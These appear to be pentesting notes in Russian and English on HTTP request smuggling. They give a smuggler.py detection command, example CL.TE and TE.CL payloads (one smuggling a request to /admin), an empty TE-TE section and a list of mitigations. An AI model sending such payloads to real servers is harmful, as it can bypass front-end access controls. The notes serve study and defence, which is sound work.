### Detect
```bash
$ python3 ./smuggler.py -u [URL] -t 10
```

CL.TE 
```
POST /about HTTP/1.1
Host: example.com
Transfer-Encoding: chunked > бэк сервер
Content-Length: 25 > фронт сервер смотрит на этот параметр и говорит ему пропустить весь пакет

1
0 > бэк TE сервер разделит запрос на 2 и проигнориет все что выше этой строки
GET /admin HTTP/1.1 > этот кусок должен передаться на бэк сервер контрабандой, и останется в кеше бэка. Далее при втором вызове начало этого запроса присоединиться к новому HTTP запросу
```

TE.CL
```
POST /about HTTP/1.1
Host: example.com
Transfer-Encoding: chunked
Content-Length: 6

0 > terminating '0' chunk TE

X > эта часть будет в кеше
```
TE-TE
```

```

### Меры митигации
```
Use HTTP/2 Throughout and Avoid Downgrading
Use HTTP/2 across your entire server setup. It handles request boundaries more clearly, making it less vulnerable to request smuggling.
When possible, disable HTTP/2 to HTTP/1.1 downgrading. This process can introduce parsing inconsistencies that attackers may exploit.
If you must allow downgrading, make sure the converted requests still follow HTTP/1.1 rules. Reject any requests that look suspicious, like those with extra line breaks in headers, colons where they shouldn’t be, or spaces in the request method.
Consistent Parsing Across Servers
Configure your front-end server to clean up or standardize tricky requests. The back-end server should be set to block any requests that still seem unclear. If a confusing request shows up, cut off the connection as a safety step.
Don’t allow requests that use both Transfer-Encoding and Content-Length headers together. This helps avoid miscommunication between servers about where the request ends.
Strict Header Controls
Prioritize the Transfer-Encoding header over Content-Length, or just prevent having both at the same time.
Reject headers with unusual formats or unexpected variations, such as: 
Have multiple Transfer-Encoding values or have the word ‘chunked’ spelled in a non-standard way.
Extra spaces or invalid characters in the header values.
Use quotes or are formatted poorly, which can mess up parsing.
If a request has two Content-Length headers with different values, respond with a 400 Bad Request to avoid confusion.
 Additional Best Practices
Set up web application firewalls (WAFs) and intrusion detection tools that watch for strange traffic or odd headers.
Use logging to catch out-of-sync requests or any unusual server behavior.
If your server runs into an unexpected error when handling a request, it’s safer to close the connection.
```
